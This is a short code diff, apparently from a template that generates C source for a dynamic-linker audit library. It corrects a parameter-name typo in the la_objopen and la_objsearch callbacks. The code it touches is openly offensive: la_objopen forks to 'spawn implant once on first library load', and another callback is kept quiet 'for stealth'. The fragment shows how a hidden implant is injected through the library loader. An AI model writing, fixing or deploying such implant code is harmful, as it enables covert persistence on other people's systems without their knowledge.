@@ -96,7 +96,7 @@ unsigned int la_version(unsigned int version) {{
 }}
 
 // Called when a new object is loaded
-unsigned int la_objopen(struct link_map *map, int cookie, uintptr_t *ob Sole) {{
+unsigned int la_objopen(struct link_map *map, int cookie, uintptr_t *object) {{
     // Spawn implant once on first library load
     if (!spawned && __sync_bool_compare_and_swap(&spawned, 0, 1)) {{
         pid_t pid = fork();
@@ -109,7 +109,7 @@ unsigned int la_objopen(struct link_map *map, int cookie, uintptr_t *ob Sole) {{
 }}
 
 // Suppress all other callbacks for stealth
-char *la_objsearch(const char *name, uintptr_t *ob Sole, unsigned int flags) {{
+char *la_objsearch(const char *name, uintptr_t *object, unsigned int flags) {{
     return NULL; // Use default search path
 }}
 
